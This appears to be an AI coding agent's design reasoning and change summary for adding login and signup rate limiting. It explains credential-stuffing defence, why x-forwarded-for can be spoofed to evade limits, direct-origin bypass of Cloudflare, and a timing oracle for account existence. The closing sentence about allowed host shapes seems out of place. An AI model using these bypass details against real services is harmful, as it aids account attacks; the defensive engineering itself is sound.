For the login route, I'm sketching the flow: check the gate before verifying credentials, return 429 with Retry-After if blocked, and on success clear only the per-account bucket — not the per-IP one, since I decided earlier that IP-level counts shouldn't reset on a single success. Given that risk, I'm considering loosening the IP limit to something like 30 per 15 minutes and 100 per hour, paired with the tighter 5-per-15-minutes per-email cap, so a single IP can't spray too many accounts while legitimate office traffic isn't blocked. The tricky part is that I can't both count failures toward the IP limit and consume the limit at attempt time without introducing a race condition, so I need an approach where both buckets are consumed up front and only the email bucket gets refunded on success.

For signup, I should consume the rate limit after format validation but before the existence check, so malformed requests don't burn tokens but valid-format enumeration attempts do get throttled — that also protects against the email-enumeration oracle via the 409 response. The consumption needs to happen before the database lookup for existing users to actually close that race.

I'm settling on 5/hour and 15/day per IP for signup, noting NAT considerations in a comment, then working out the Retry-After calculation: find the oldest timestamp that needs to age out of the window for the count to drop below the limit, and compute how long until that happens.

Writing the retry-after helper function...

Now I'm writing the consume function that sweeps expired entries, filters hits per rule window, and determines if any rule is violated, tracking the maximum retry time needed across all violated rules.

For the sweep function, I'm adding memory bounds: if the store exceeds a max key count, I first remove keys whose hits are entirely stale, then if still over capacity, evict the least-recently-active keys rather than wiping everything—since a full clear would let an attacker reset their own rate limit counter.

I'm also considering an edge case: an attacker flooding with unique IPs to trigger eviction wouldn't actually hurt themselves, since their own bucket is newest and survives—worst case they'd only be evicting other users' near-expired buckets, which is harmless.

None of these operations can throw since they're pure memory and array ops, so fail-closed is the intended direction. The real honest caveat is that a process restart or deploy wipes the in-memory counters, which unavoidably fails open — I should state that plainly rather than gloss over it. For email keying, I'm hashing with a per-process random salt, which is fine since a restart resets both the salt and the counters together.

The 400 response for missing email/password also happens before the limiter, which seems fine since there's no real work being done there. The key design concern is ordering: if I check and consume the IP bucket first and it's denied, I shouldn't also consume the email bucket, since that would let an already-blocked attacker still burn through a victim's email attempts as a denial-of-service trick. So I'm restructuring the logic into separate check and record steps — evaluating both the IP and email limits first without consuming anything, and only recording consumption against both buckets if both checks pass. Since there are no awaits between the check and the record, this stays atomic and avoids any race condition, and if either check fails I return early without consuming either bucket.

I also want to keep the IP buckets for login and signup completely separate, so abuse on one flow doesn't accidentally lock out the other. That's a real fail-closed outage risk — if everyone shares one bucket, the whole prod login flow could get locked out together. I could try falling back to the first XFF entry when cf-connecting-ip is missing, though that adds its own trust complexity.

Actually, since nginx forwards CF-Connecting-IP reliably and successes get refunded on login, a shared bucket there is tolerable — only users mistyping passwords get throttled. Signup is riskier though, since there's no refund mechanism, so a global 5/hour limit there would block legitimate new users.

I'll deliberately fail closed for non-edge traffic and document this clearly as an intentional security choice, verifiable by checking the header at the edge. I'll keep the signup limiter keyed purely on IP volume as instructed, without adding email domain checks, and move on to writing the files.

## H2 — pre-auth rate limiting

**Files:** `lib/rate-limit.ts` (+338 lines, existing limiters untouched), `app/api/auth/login/route.ts`, `app/api/auth/signup/route.ts`

**Keying.** Login is gated on two buckets that must *both* pass before either is consumed:
- **per-IP** — 20 / 15 min and 60 / hour. Stops spraying from one source.
- **per-account** (SHA-256 of the email with a per-process salt, so the map isn't a running plaintext list of attempted addresses) — 5 / 15 min and 20 / hour. This is the credential-stuffing answer: many IPs against one email is exactly the case an IP key cannot see. Both verdicts are taken before either is recorded, so an attacker already blocked on their own IP can't keep filling victims' account buckets.

Signup is **per-IP only** — 5 / hour, 15 / day. It is a volume problem, and the daily rule is what bounds the money (750 credits ≈ $1.50 per account that lands).

**Consume-then-refund, not count-failures.** Counting only failures means the write happens after `verifyPassword` resolves, with `await`s in between — a thousand concurrent guesses would all pass the check before the first failure was recorded, and the limiter would read as correct while stopping nothing. So every login attempt consumes synchronously, and a correct password calls `noteLoginSuccess`, which **clears the account bucket** (whoever proved the password owns the account) and **refunds one hit on the IP bucket** (so a NAT'd office is never spent by people signing in correctly, while an attacker who owns one valid account can't log into it repeatedly to wipe guesses made against everyone else). Proven: 25 consecutive successful logins from one IP, all 200, well past the 20/15-min cap.

**Client IP header — `cf-connecting-ip`, and nothing else.** Cloudflare *sets* it on every request, overwriting the client's value. `x-forwarded-for`'s **first** entry is attacker-controlled, because Cloudflare appends rather than replaces — that is exactly bug M3 in `app/api/contact/route.ts`, and keying on it would hand an attacker a fresh bucket per request. The **last** entry isn't spoofable but is useless: each nginx hop appends the *previous* hop's address, so on arrival it is our own front nginx, a constant that would bucket the whole internet together. Reasoning is written out in the file.

**Fail direction — closed.** A request with no `cf-connecting-ip` did not come through the edge (Next gives a route handler no socket address to fall back on), so all such traffic shares one strict bucket rather than being exempt. Residual, stated in the comment: anyone who can reach the origin IP directly, bypassing Cloudflare, *can* forge `cf-connecting-ip` — no application code can detect that; the fix is firewalling the origin to Cloudflare's ranges, which is infra work outside this repo.

**Storage — in-memory, deliberately, and this is the main caveat.** The two DB-backed limiters count rows the feature already writes (`Build`, `Project`); a failed login writes nothing, and `prisma/schema.prisma` is off-limits, so there is no table for it. I considered and rejected borrowing the analytics `Event` table: its contract is an explicit closed vocabulary of non-PII product events that the privacy policy is written from, and IP-keyed security counters are neither. So **this is per-process and resets on every deploy or restart — it fails open across that boundary**, and if the app is ever run as more than one process the effective limit multiplies by the process count. The check → record → forget shape is deliberately the shape a `LoginAttempt` table would have; promoting it is a one-model migration and is the right next step.

**Non-disclosure.** One shared `RATE_LIMITED_MESSAGE` for both rules and both routes. I also added a decoy scrypt hash to login so an unknown email costs the same as a wrong password — previously `verifyPassword` was skipped entirely for unknown addresses, a clean ~100ms-vs-1ms existence oracle that undercut the constant response *shape* the route already kept. Measured after: registered 0.047s / 0.046s / 0.046s vs unknown 0.046s / 0.064s / 0.043s, both 401.

**Tested** against a local production build on `:3009`: per-account cap trips on attempt 6 with each guess from a different IP (203.0.113.1–7); identical 401→429 sequence and identical body for a nonexistent address; per-IP cap trips on attempt 21 across 22 distinct targets from one IP; `Retry-After: 897` then `900` (window-aware, not a flat hour); signup allows exactly 5 then 429 on a fresh key, a second IP unaffected; malformed bodies (400) consume nothing; 4 failures → correct password → 5 more failures all 401, proving the success clear. Three shapes allowed: `<slug>.kodely.site` (**must match this slug** — `a.kodely.site/api/site/b/` is refused, which also stops one customer hosting another's page on their origin), the staging host (`KODELY_STAGING_HOST`, default `staging.kodely.me`), and loopback.
